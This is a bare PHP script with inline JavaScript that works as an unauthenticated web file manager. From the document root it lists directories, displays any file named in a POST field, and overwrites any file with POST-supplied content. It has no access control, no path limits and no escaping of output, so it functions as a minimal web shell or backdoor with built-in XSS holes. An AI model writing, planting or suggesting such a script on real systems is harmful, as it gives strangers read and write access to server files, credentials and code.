<?php
echo "<form action=\"\" method=\"post\" id=\"fm\">";
function getFile($path,$charset) {
     header("Content-Type:text/html;charset=".$charset);
     if (is_dir($path)) {
          $dir = opendir ( $path );
          while ( $file = readdir ( $dir ) ) {
               echo "<a href=\"javascript:get('".str_replace('\\','/',$path)."/".$file."');\">".$file."</a><br/>\n";
          }
          closedir($dir);
     } else {
          echo "File:<input type=\"text\" style=\"width:600px;\" name=\"file\" value=\"".$path."\" /><input type=\"button\" style=\"margin-left:20px;\" value=\"update\" onclick=\"update()\" /><span id=\"result\"></span><br/>";
          echo "<textarea style=\"width:800px;height:600px;\" name=\"data\">".file_get_contents($path)."</textarea>";
     }
     echo "<input type=\"hidden\" name=\"p\" id=\"p\" value=\"".$path."\"/><input type=\"hidden\" name=\"action\" id=\"action\" value=\"get\" /></form>";
}
function update($filename,$data){
     file_put_contents($filename, $data);
     echo "<script>history.back(-1);alert('ok');</script>";
}
if('update'==$_POST['action']){
     update($_POST['file'],$_POST['data']);
}else{
     getFile($_POST['p']!=''?$_POST['p']:$_SERVER['DOCUMENT_ROOT'],$_POST['charset']!=''?$_POST['charset']:"UTF-8");
}
?>
<script>
function get(p){
     document.getElementById('p').value = p;
     document.getElementById('action').value = "get";
     document.getElementById('fm').submit();
}
function update(){
     document.getElementById('action').value = "update";
     document.getElementById('fm').submit();
}
</script>
